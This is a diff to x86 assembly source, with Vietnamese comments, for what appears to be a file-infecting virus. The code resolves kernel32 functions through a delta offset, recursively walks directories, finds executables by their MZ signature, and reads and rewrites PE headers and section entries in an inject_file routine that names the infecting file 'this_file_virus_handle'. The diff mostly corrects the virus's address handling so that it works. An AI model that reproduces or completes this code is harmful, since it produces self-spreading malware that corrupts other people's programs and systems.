@@ -129,139 +129,141 @@ mov		[offset delta + ebp], ebp
 ;Lay ham FindFirstFile
 mov		eax, offset findfirstfile
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 
 push	eax
 push	ebx
 call	ecx
 
-mov		[fff + ebp], eax
+mov		[offset fff + ebp], eax
 
 ;Lay ham FindNextFile
 mov		eax, offset findnextfile
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[fnf + ebp], eax
+mov		[offset fnf + ebp], eax
 
 ;Lay ham RtlZeroMemory
 mov		eax, offset memsetzero
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[msz + ebp], eax
+mov		[offset msz + ebp], eax
 
 ;Lay ham CreateFile
 mov		eax, offset createfile
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[cf + ebp], eax
+mov		[offset cf + ebp], eax
 
 ;Lay ham ReadFile
 mov		eax, offset readfile
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[rf + ebp], eax
+mov		[offset rf + ebp], eax
 
 ;Lay ham WriteFile
 mov		eax, offset writefile
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[wf + ebp], eax
+mov		[offset wf + ebp], eax
 
 ;Lay ham MessageBox
 mov		eax, offset messagebox
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[mg + ebp], eax
+mov		[offset mg + ebp], eax
 
 ;Lay ham lstrlen
 mov		eax, offset len
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[strlen + ebp], eax
+mov		[offset strlen + ebp], eax
 
 ;Lay ham lstrcpy
 mov		eax, offset cpy
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[strcpy + ebp], eax
+mov		[offset strcpy + ebp], eax
 
 ;Lay ham CloseHandle
 mov		eax, offset clshandle
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[clh + ebp], eax
+mov		[offset clh + ebp], eax
 
 ;Lay ham GetModuleFileName
 mov		eax, offset getpathfile
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[gmfn + ebp], eax
+mov		[offset gmfn + ebp], eax
 
 ;Lay ham GetCurrentDirectoryA
 
 mov		eax, offset getpath
 add		eax, ebp
-mov		ebx, [kernel32 + ebp]
-mov		ecx, [gpa + ebp] 
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
 push	eax
 push	ebx
 call	ecx
-mov		[gcd + ebp], eax
+mov		[offset gcd + ebp], eax
 
 
 
-lea		eax, [path + ebp]
+lea		eax, [offset path + ebp]
 push	eax					;path
 push	256					;size
-call	[gcd + ebp]			;GetCurrentDirectoryA
+call	[offset gcd + ebp]			;GetCurrentDirectoryA
 
-lea		eax, [path + ebp]
+lea		ecx, path
+add		ecx, ebp
+
 xor		ebx, ebx
-mov		ebx, [delta+ebp]
+mov		ebx, [offset delta + ebp]
 
 push	ebx
-push	eax
+push	ecx
 call	browse_files
 ;---------------------------------------------------------------------
 inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
@@ -283,16 +285,24 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	xor		eax, eax
 	lea		eax, path_file_current
 	
+	mov		ebx, del
+	add		ebx, offset gmfn
+	mov		ebx, [ebx]
+	
 	push	262
 	push	eax
 	push	0
-	call	[gmfn+del]
+	call	ebx			;getmodulefilenamea
 	
 	cmp		eax, 0
 	je		end_inject_file
 	
 	xor		eax, eax
 	lea		eax, path_file_current
+	
+	mov		ebx, del
+	add		ebx, offset cf
+	mov		ebx, [ebx]
 	
 	push	0
 	push	80h					;normal
@@ -301,7 +311,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	push	00000003h			;read va write
 	push	0C0000000h			;read va write
 	push	eax					;pathtmp
-	call	[cf+ebp]			;CreateFile
+	call	ebx					;CreateFile
 	
 	
 	cmp 	eax, 0ffffffffh
@@ -318,11 +328,14 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	;read e_lfanew
 	lea		ebx, ov
 	lea		ecx, inject_tmp
+	mov		edx, del
+	add		edx, offset rf
+	mov		edx, [edx]
 	push	0
 	push	4							;4 byte
 	push	ecx							;buffer
 	push	this_file_virus_handle		;handle
-	call	[rf+del]					;ReadFile
+	call	edx 						;ReadFile
 	
 	mov		ebx, inject_tmp
 	lea		eax, ov
@@ -334,12 +347,16 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	lea		ebx, ov
 	lea		ecx, numberofsection
 	
+	mov		edx, del
+	add		edx, offset rf
+	mov		edx, [edx]
+	
 	push	ebx
 	push	0
 	push	2							;4 byte
 	push	ecx							;buffer
 	push	this_file_virus_handle		;handle
-	call	[rf+del]					;ReadFile
+	call	edx							;ReadFile
 	
 	mov		ebx, inject_tmp
 	lea		eax, ov
@@ -351,12 +368,16 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	lea		ebx, ov
 	lea		ecx, aop_virus
 	
+	mov		edx, del
+	add		edx, offset rf
+	mov		edx, [edx]
+	
 	push	ebx
 	push	0
 	push	4							;4 byte
 	push	ecx							;buffer
 	push	this_file_virus_handle		;handle
-	call	[rf+del]					;ReadFile
+	call	edx							;ReadFile
 	
 	xor		edx, edx
 	xor 	ecx, ecx
@@ -374,13 +395,17 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	;read AddressOfEntryPoint
 	lea		ebx, ov
 	lea		ecx, section
+
+	mov		edx, del
+	add		edx, offset rf
+	mov		edx, [edx]
 	
 	push	ebx
 	push	0
 	push	40							;40 byte
 	push	ecx							;buffer
 	push	this_file_virus_handle		;handle
-	call	[rf+del]					;ReadFile
+	call	edx							;ReadFile
 	
 	mov		eax, [section+0ch]
 	mov		ebx, aop_virus
@@ -399,13 +424,16 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
 	lea		ebx, ov
 	lea		ecx, section
+	lea		edx, rf
+	add		edx, del
+	mov		edx, [edx]
 	
 	push	ebx
 	push	0
 	push	40							;40 byte
 	push	ecx							;buffer
 	push	this_file_virus_handle		;handle
-	call	[rf+del]					;ReadFile
+	call	edx 						;ReadFile
 	
 	mov		eax, [section+0ch]
 	mov		ebx, aop_virus
@@ -419,13 +447,16 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
 	lea		ebx, ov
 	lea		ecx, injected
+	lea		edx, rf
+	add		edx, del
+	mov		edx, [edx]
 	
 	push	ebx
 	push	0
 	push	4							;40 byte
 	push	ecx							;buffer
 	push	handleF						;handle
-	call	[rf+del]					;ReadFile
+	call	edx							;ReadFile
 	
 	mov		ebx, injected
 	lea		eax, ov
@@ -436,12 +467,17 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	lea		ebx, ov
 	lea		ecx, nos_injected
 	;doc so section cua file bi lay
+	lea		edx, rf
+	add		edx, del
+	mov		edx, [edx]
+	
 	push	ebx
 	push	0
 	push	2							;40 byte
 	push	ecx							;buffer
 	push	handleF						;handle
-	call	[rf+del]					;ReadFile
+	call	edx							;ReadFile
+	
 	xor		eax, eax
 	mov		ax, nos_injected
 	mov		bl, 40
@@ -456,12 +492,17 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	lea		edx, ov 
 	lea		eax, section
 	
+	
+	lea		ebx, wf
+	add		ebx, del
+	mov		ebx, [ebx]
+	
 	push	edx
 	push	0
 	push	40
 	push	eax
 	push	handleF
-	call	[wf+del]				
+	call	ebx				
 	
 	
 	
@@ -482,7 +523,28 @@ browse_files PROC uses eax ebx ecx edx, pathFile:dword, del:dword
 
 find_first_file:
 
-lea		ebx, [pathFile + ebp]
+xor		ebx, ebx
+mov		eax, del
+add		eax, offset msz
+mov		eax, [eax]
+mov		ebx, 262
+lea		ecx, pathtmp
+
+push	ebx			;size
+push	ecx			;buff
+call 	eax			;call RtlZeroMemory
+
+mov		ebx, del
+add		ebx, offset strcpy
+mov		ebx, [ebx]
+mov		ecx, pathFile		
+lea		edx, pathtmp
+push	ecx					;pathFile
+push	edx					;pathtmp
+call	ebx					;call lstrcpy
+
+
+mov		ebx, pathFile
 add		ebx, eax
 mov		al, 5ch
 mov		[ebx], al
@@ -490,22 +552,34 @@ inc		ebx
 mov		al, 2ah
 mov		[ebx], al
 
+mov		ecx, del
+add		ecx, offset fff
+mov		eax, [ecx]
 
-mov		eax, [fff + ebp]
-lea		ebx, [pathFile+ebp]
-lea		ecx, [dwFileAttributes + ebp]
+mov		ebx, pathFile
+
+mov		ecx, del
+add		ecx, offset dwFileAttributes
+
 
 push	ecx			;WIN32_FIND_DATAA
 push	ebx			;pathFile
 call 	eax			;FindFirstFile
+
 cmp		eax, -1
 jz		done_find
-mov		[h_file + ebp], eax
+
+lea		ecx, hfind
+mov		[ecx], eax
+
 
 find_next_file:
 
 ;check folder
-mov		ecx, [dwFileAttributes + ebp]
+
+mov		ecx, del
+add		ecx, offset dwFileAttributes
+mov		ecx, [ecx]
 test	ecx, 10h
 jnz		check_home	;folder thi check . va .., khong thi tim file thuc thi de lay
 
@@ -513,31 +587,32 @@ jnz		check_home	;folder thi check . va .., khong thi tim file thuc thi de lay
 ;check file thuc thi de lay file
 
 
-mov		ebx, [strcpy + ebp]
-mov		ecx, pathFile
-add		ecx, eax		
-lea		edx, pathtmp
-push	edx					;pathtmp
-push	ecx					;pathFile
-call	ebx					;call lstrcpy
-
-
-mov		eax, [strlen + ebp]
+mov		eax, del
+add		eax, offset strlen
+mov		eax, [eax]
 
 lea		ebx, pathtmp
-push	ebx				;	string
+push	ebx					;string
 call 	eax					;call lstrlen
 
 dec		eax
-mov		ebx, [strcpy + ebp]
+mov		ebx, del
+add		ebx, offset strcpy 
+mov		ebx, [ebx]
 lea		ecx, pathtmp
-add		ecx, eax		
-lea		edx, [cFileName +ebp]
+add		ecx, eax
+mov		edx, del
+add		edx, offset cFileName
+		
 push	ecx					;pathtmp[eax]
 push	edx					;cFileName
 call	ebx					;call lstrcpy
 
 lea		eax, pathtmp
+
+mov		ebx, del
+add		ebx, offset cf
+mov		ebx, [ebx]
 
 push	0
 push	80h					;normal
@@ -546,41 +621,67 @@ push	0
 push	00000003h			;read va write
 push	0C0000000h			;read va write
 push	eax					;pathtmp
-call	[cf+ebp]			;CreateFile
+call	ebx					;CreateFile
 
-mov		[h_file + ebp], eax	
+mov		ebx, del
+add		ebx, offset h_file
+mov		[ebx], eax	
 
-lea		eax, [tmp +ebp]
+mov		eax, del
+add		eax, offset tmp
+
+mov		ebx, del
+add		ebx, offset rf
+mov		ebx, [ebx]
+
+mov		ecx, del
+add		ecx, offset h_file
+mov		ecx, [ecx]
 
 push	0
 push	0
 push	4
 push	eax
-push	[h_file+ebp]
-call	[rf + ebp]			;ReadFile
+push	ecx
+call	ebx			;ReadFile
 
 xor		eax, eax
-mov		eax, [tmp+ebp]
+mov		eax, del
+add		eax, offset tmp
+mov		eax, [eax]
 
 cmp		ax, 5a4dh
 
 jne		close_handle
 
-push	[delta]
-push	[h_file + ebp]
+mov		ebx, del
+add		ebx, offset h_file
+mov		ebx,[ebx]
+
+push	delta
+push	ebx
 call 	inject_file
 
 
 close_handle:
 
-push	[h_file + ebp]	;h_file
-call	[clh+ebp]		;closehandle
+mov		ebx, del
+add		ebx, offset h_file
+mov		ebx, [ebx]
+mov		ecx, del
+add		ecx, offset clh
+mov		ecx, [ecx]
+push	ebx						;h_file
+call	ecx						;closehandle
 
 jmp		next_file
 
 ;check folder . va ..
 check_home:
-mov		al, byte ptr [cFileName + del]
+mov		ebx, del
+add		ebx, offset cFileName
+mov		al, byte ptr [ebx]
+
 cmp		al, 2eh
 je		next_file		;neu la . va .. thi bo qua de FindNextFile neu khong thi check junction
 
@@ -593,29 +694,37 @@ jnz		next_file		;neu la junction thi bo qua de FindNextFile neu khong thi de quy
 
 ;xu ly path de de quy
 
-mov		eax, [strlen + ebp]
+mov		eax, del
+add		eax, offset strlen
+mov		eax, [eax]
 
 lea		ebx, pathtmp
 push	ebx					;string
 call 	eax					;call lstrlen
 
 dec		eax
-mov		ebx, [strcpy + ebp]
+mov		ebx, del
+add		ebx, offset strcpy
+mov		ebx, [ebx]
 lea		ecx, pathtmp
-add		ecx, eax		
-lea		edx, [cFileName +ebp]
-push	ecx					;pathtmp[eax]
-push	edx					;cFileName
+add		ecx, eax
+mov		edx, del
+add		edx, offset cFileName		
+
+push	edx					;pathtmp[eax]
+push	ecx					;cFileName
 call	ebx					;call lstrcpy
 
-mov		eax, [strlen + ebp]
+mov		eax, del
+add		eax, offset strlen
+mov		eax, [eax]
 
 lea		ebx, pathtmp
 push	ebx					;string
 call 	eax					;call lstrlen
 
 dec		eax
-lea		ebx, [pathtmp + ebp]
+lea		ebx, pathtmp
 add		ebx, eax
 mov		al, 5ch
 mov		[ebx], al
@@ -637,25 +746,38 @@ call	browse_files
 
 next_file:
 
-push	[h_file + ebp]	;h_file
-call	[clh+ebp]		;closehandle
 
+;mov		ebx, del
+;add		ebx, offset h_file
+;mov		ebx, [ebx]
+;mov		ecx, del
+;add		ecx, offset clh
+;mov		ecx, [ecx]
+;push	ebx						;h_file
+;call	ecx						;closehandle
 
 xor		ebx, ebx
-mov		eax, [msz + ebp]
+mov		eax, del
+add		eax, offset msz
+mov		eax, [eax]
 mov		ebx, 140h
-lea		ecx, [dwFileAttributes + ebp]
+mov		ecx, del
+add		ecx, offset dwFileAttributes
 
-push	ecx			;buff
-push	ebx			;size
+push	ebx			;buff
+push	ecx			;size
 call 	eax			;call RtlZeroMemory
 
-mov		eax, [fnf + ebp]
-mov		ebx, [h_file+ebp]
-lea		ecx, [dwFileAttributes + ebp]
+mov		eax, del
+add		eax, offset fnf
+mov		eax, [fnf]
+mov		ebx, hfind
 
-push	ecx			;hfind
-push	ebx			;win32_find_data
+mov		ecx, del
+add		ecx, offset dwFileAttributes		
+
+push	ecx			;win32_find_data
+push	ebx			;hfind
 call 	eax			;call FindNextFile
 
 cmp		eax, 0h
